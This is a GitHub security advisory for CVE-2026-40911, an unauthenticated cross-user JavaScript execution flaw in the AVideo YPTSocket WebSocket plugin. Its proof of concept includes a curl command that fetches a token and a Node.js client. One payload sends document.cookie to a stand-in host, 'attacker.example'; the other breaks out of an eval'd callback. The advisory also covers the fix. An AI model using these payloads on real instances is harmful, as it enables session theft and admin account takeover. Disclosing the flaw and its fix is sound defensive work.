# [C] WWBN AVideo YPTSocket WebSocket Broadcast Relay Leads to Unauthenticated Cross-User JavaScript Execution via Client-Side eval() Sinks

## Summary
Severity: Critical
Advisory: GHSA-gph2-j4c9-vhhr
CVE: CVE-2026-40911
CWE: CWE-94
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2026-04-14
Source: https://github.com/advisories/GHSA-gph2-j4c9-vhhr
Type: github-advisory

## Affected
- Packagist: `wwbn/avideo` — affected >=0

## Details
## Summary

The YPTSocket plugin's WebSocket server relays attacker-supplied JSON message bodies to every connected client without sanitizing the `msg` or `callback` fields. On the client side, `plugin/YPTSocket/script.js` contains two `eval()` sinks fed directly by those relayed fields (`json.msg.autoEvalCodeOnHTML` at line 568 and `json.callback` at line 95). Because tokens are minted for anonymous visitors and never revalidated beyond decryption, an unauthenticated attacker can broadcast arbitrary JavaScript that executes in the origin of every currently-connected user (including administrators), resulting in universal account takeover, session theft, and privileged action execution.

## Details

### Token issuance is unauthenticated

`plugin/YPTSocket/getWebSocket.json.php:11-21` returns a token to anyone whose request reaches the endpoint — the only check is that the plugin is enabled:

```php
if(!AVideoPlugin::isEnabledByName("YPTSocket")){
    $obj->msg = "Socket plugin not enabled";
    die(json_encode($obj));
}
$obj->error = false;
$obj->webSocketToken = getEncryptedInfo(0);
$obj->webSocketURL = YPTSocket::getWebSocketURL();
```

`getEncryptedInfo()` in `plugin/YPTSocket/functions.php:3-16` populates `from_users_id = User::getId()` (0 for guests) and `isAdmin = User::isAdmin()` (false for guests). The issued token is accepted by the WebSocket server's `onOpen` handler (`Message.php:44-52`) solely by successful decryption — there is no requirement for the connecting principal to be authenticated.

### Server relays attacker JSON verbatim

`plugin/YPTSocket/Message.php:191-245` — the default branch of `onMessage` only rewrites `from_identification`:

```php
public function onMessage(ConnectionInterface $from, $msg) {
    ...
    $json = _json_decode($msg);
    if (empty($json->webSocketToken)) { return false; }
    if (!$msgObj = getDecryptedInfo($json->webSocketToken)) { return false; }

    switch ($json->msg) {
        ...
        default:
            $this->msgToArray($json);
            if (isset($json['from_identification'])) {
                $json['from_identification'] = strip_tags((string)($msgObj->user_name ?? ''));
            }
            ...
            } else {
                $this->msgToAll($from, $json);  // broadcast
            }
            break;
    }
}
```

`msgToResourceId()` at `Message.php:297-310` copies the attacker-controlled `callback` and `msg` fields into the outbound payload:

```php
if (isset($msg['callback'])) {
    $obj['callback'] = $msg['callback'];  // tainted
    ...
}
...
} else if (!empty($msg['msg'])) {
    $obj['msg'] = $msg['msg'];  // tainted — entire object forwarded verbatim
}
```

`$obj` is JSON-encoded at line 335 and sent to every connected client.

### Client-side sink #1: `autoEvalCodeOnHTML` → eval

`plugin/YPTSocket/script.js:163-169` (raw WebSocket transport) sets every inbound frame as `yptSocketResponse` and unconditionally calls `parseSocketResponse()`:

```js
connWS.onmessage = function (e) {
    var json = JSON.parse(e.data);
    ...
    yptSocketResponse = json;
    parseSocketResponse();
    ...
};
```

`parseSocketResponse()` at `script.js:545-569` reaches the sink:

```js
async function parseSocketResponse() {
    const json = yptSocketResponse;
    ...
    if (json.msg?.autoEvalCodeOnHTML !== undefined) {
        eval(json.msg.autoEvalCodeOnHTML);   // <-- attacker-controlled
    }
    ...
}
```

### Client-side sink #2: `json.callback` → eval

`plugin/YPTSocket/script.js:91-95` — `processSocketJson()` concatenates attacker-controlled `json.callback` into an eval'd string. This path is reachable on BOTH transports: the raw WebSocket branch (`script.js:182`) and the Socket.IO branch (`script.js:339` via `socket.on("message", (data) => { … processSocketJson(data) })`):

```js
if (json.callback) {
    var code = "if (typeof " + json.callback + " == 'function') { myfunc = " + json.callback + "; } else { myfunc = defaultCallback; }";
    socketLog('Executing callback:', json.callback);
    eval(code);
    ...
}
```

Because `json.callback` is interpolated as raw source, a payload like `alert(document.cookie);window.x` breaks out of the `typeof` expression and executes during the condition evaluation.

## PoC

Prerequisite: target is running AVideo with the YPTSocket plugin enabled (default on most installs).

**Step 1 — obtain a token anonymously** (no cookies, no auth):

```bash
curl -s 'https://target.example/plugin/YPTSocket/getWebSocket.json.php'
```

Expected output (abbreviated):
```json
{"error":false,"msg":"","webSocketToken":"<long encrypted token>","webSocketURL":"wss://target.example:8888/?webSocketToken=<token>&..."}
```

**Step 2 — connect to the WebSocket endpoint** using the returned `webSocketURL`. A minimal Node.js client:

```js
const WebSocket = require('ws');
const TOKEN = '<token from step 1>';
const URL   = '<webSocketURL from step 1>';
const ws = new WebSocket(URL, { rejectUnauthorized: false });

ws.on('open', () => {
    // Payload 1 — primary sink (raw WebSocket transport):
    ws.send(JSON.stringify({
        webSocketToken: TOKEN,
        msg: {
            autoEvalCodeOnHTML:
                "fetch('https://attacker.example/x?c='+encodeURIComponent(document.cookie));" +
                "alert('XSS as '+document.domain);"
        }
    }));

    // Payload 2 — secondary sink (reaches both raw WS and Socket.IO clients):
    ws.send(JSON.stringify({
        webSocketToken: TOKEN,
        msg: "p",
        callback: "alert(document.domain);window.x"
    }));
});
```

**Step 3 — observe impact.** Every other user currently connected to the same AVideo instance (via any page that loads YPTSocket's `script.js` — the global footer, the admin dashboard, live streams, video pages) receives the broadcast. In their browser:

- Payload 1 reaches `parseSocketResponse()` at line 568 and evaluates `eval(json.msg.autoEvalCodeOnHTML)`, firing the exfiltration request to `attacker.example` with `document.cookie`.
- Payload 2 reaches `processSocketJson()` at line 95; the synthesized `code` string is `if (typeof alert(document.domain);window.x == 'function') { ... }`, which executes `alert(document.domain)` during the `typeof` evaluation.

Any administrator who is online at the moment of the broadcast has their session cookie exfiltrated and/or arbitrary actions performed in their browser context.

## Impact

A single unauthenticated request and one WebSocket frame grants the attacker **universal client-side code execution** across every user currently connected to the target AVideo instance. Concretely:

- Session theft of every connected user, including administrators (note: `HttpOnly` does not help because the attacker's JS runs in-origin and can call privileged endpoints directly without ever reading cookies).
- Privileged action execution on behalf of any admin who happens to be online — including plugin installation (`GHSA-v8jw-8w5p-23g3` shows admin plugin ZIP upload is already an RCE primitive), user promotion/demotion, video deletion, configuration changes.
- Stored cross-user JS persistence via `localStorage`, IndexedDB, or re-submitting the payload as a comment/title through admin credentials.
- Financial redirection (payment flows, crypto-donation addresses) and phishing via arbitrary DOM rewriting of the authentic AVideo origin.
- The scope change (S:C) is genuine: an unauthenticated (or low-privileged) attacker's actions cross the trust boundary into every other user's browser authorization context, including admin.

## Recommended Fix

Multiple defense-in-depth layers are required:

**1. Remove the client-side eval sinks entirely.** `plugin/YPTSocket/script.js`:

```diff
- if (json.msg?.autoEvalCodeOnHTML !== undefined) {
-     eval(json.msg.autoEvalCodeOnHTML);
- }
```

No legitimate server flow should push arbitrary JavaScript through a broadcast channel — if server-driven UI updates are needed, use structured data and predefined handler functions.

Replace the callback dispatch at lines 91-95 with a strict name-based lookup against a predefined allowlist:

```diff
- if (json.callback) {
-     var code = "if (typeof " + json.callback + " == 'function') { myfunc = " + json.callback + "; } else { myfunc = defaultCallback; }";
-     eval(code);
-     ...
- } else {
-     myfunc = defaultCallback;
- }
+ var ALLOWED_CALLBACKS = ['socketNewConnection', 'socketDisconnection', /* ... */];
+ if (typeof json.callback === 'string' && ALLOWED_CALLBACKS.indexOf(json.callback) !== -1
+     && typeof window[json.callback] === 'function') {
+     myfunc = window[json.callback];
+     const event = new CustomEvent(json.callback, { detail: _details });
+     document.dispatchEvent(event);
+ } else {
+     myfunc = defaultCallback;
+ }
```

**2. Server-side: allowlist keys on relayed `msg` objects.** In `plugin/YPTSocket/Message.php::onMessage()` default branch, whitelist the fields permitted in relayed broadcasts rather than forwarding `$msg['msg']` verbatim:

```php
// At top of default branch, after msgToArray:
$ALLOWED_MSG_KEYS = ['type', 'text', 'videos_id', 'users_id', /* ... */];
if (isset($json['msg']) && is_array($json['msg'])) {
    $json['msg'] = array_intersect_key($json['msg'], array_flip($ALLOWED_MSG_KEYS));
}
// Similarly sanitize callback:
if (isset($json['callback']) && !preg_match('/^[a-zA-Z_][a-zA-Z0-9_]*$/', (string)$json['callback'])) {
    unset($json['callback']);
}
```

**3. Restrict token issuance and sender privileges.** `plugin/YPTSocket/getWebSocket.json.php` should require authentication (or at least reject anonymous broadcast capability). Unprivileged senders should not be permitted to trigger `msgToAll` at all — the default branch of `onMessage` should require `$msgObj->isAdmin` (or equivalent) before allowing broadcasts, since there is no legitimate reason for arbitrary clients to originate system-wide messages.

## References
- https://github.com/WWBN/AVideo/security/advisories/GHSA-gph2-j4c9-vhhr
- https://nvd.nist.gov/vuln/detail/CVE-2026-40911
- https://github.com/WWBN/AVideo/commit/c08694bf6264eb4decceb78c711baee2609b4efd
- https://github.com/WWBN/AVideo
